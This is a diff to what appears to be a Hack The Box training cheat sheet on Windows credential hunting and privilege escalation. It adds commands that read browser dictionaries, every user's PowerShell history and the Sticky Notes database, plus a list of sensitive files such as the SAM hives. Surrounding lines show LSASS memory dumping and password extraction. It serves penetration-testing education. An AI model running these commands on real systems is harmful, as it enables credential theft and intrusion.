@@ -2557,6 +2557,7 @@ C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
 |                                                                                                          |                                                                                                                                                                                                                                          |
 | `tasklist /svc`                                                                                          | A command-line-based utility in Windows used to list running processes.                                                                                                                                                                  |
 | `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`                          | Uses Windows command-line based utility findstr to search for the string "password" in many different file type.                                                                                                                         |
+| `gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'`          | Review Dictionary file for sensitive information |
 | `Get-Process lsass`                                                                                      | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.                                                         |
 | `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`                               | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.                                                                                                  |
 | `pypykatz lsa minidump /path/to/lsassdumpfile`                                                           | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.                                                                                                                      |
@@ -3312,6 +3313,7 @@ There is no command-line version of the GUI consent prompt, so its necessary to 
 | `gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password` | Searching for passwords in Chrome dictionary files |
 | `(Get-PSReadLineOption).HistorySavePath` | Confirm PowerShell history save path |
 | `gc (Get-PSReadLineOption).HistorySavePath` | Reading PowerShell history file |
+| `foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`| Retreive all PowerShell history files which we can access as our current user.|
 | `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'` | Decrypting PowerShell credentials |
 | `cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt` | Searching file contents for a string |
 | `findstr /si password *.xml *.ini *.txt *.config` | Searching file contents for a string |
@@ -3327,6 +3329,29 @@ There is no command-line version of the GUI consent prompt, so its necessary to 
 | `Invoke-SessionGopher -Target WINLPE-SRV01` | Running SessionGopher |
 | `netsh wlan show profile` | View saved wireless networks |
 | `netsh wlan show profile ilfreight_corp key=clear` | Retrieve saved wireless passwords |
+| `Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" \| ft -wrap`| Import [PSSQLITE Module](https://github.com/RamblingCookieMonster/PSSQLite) to view data from Sticky Notes DB |
+
+Other files of interest within Windows include 
+```
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
+```
 
 ### Other Commands
 
